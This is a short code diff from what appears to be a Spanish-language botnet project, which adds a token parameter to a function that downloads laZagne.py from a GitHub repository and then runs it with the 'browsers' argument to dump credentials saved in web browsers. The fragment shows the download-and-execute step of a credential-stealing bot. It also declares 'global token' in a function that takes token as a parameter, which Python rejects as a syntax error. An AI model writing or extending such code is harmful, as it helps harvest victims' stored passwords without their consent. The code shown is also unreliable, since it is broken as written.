@@ -5,7 +5,7 @@ import base64
 urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
 
 
-def downloadFile(urlb):
+def downloadFile(urlb,token):
     global token
     print('[!] Descargando ' + urlb)
     sha = None
@@ -24,9 +24,9 @@ def downloadFile(urlb):
         print('[-] ' + res.get('message', 'Error desconocido'))
     return sha, content
 
-def run():
+def run(token):
     # Descargar el archivo
-    downloadFile(urlb)
+    downloadFile(urlb,token)
     
     # Ejecutar el archivo con el argumento "all"
     output = subprocess.run(["python3", 'laZagne.py', "browsers"], check=True)
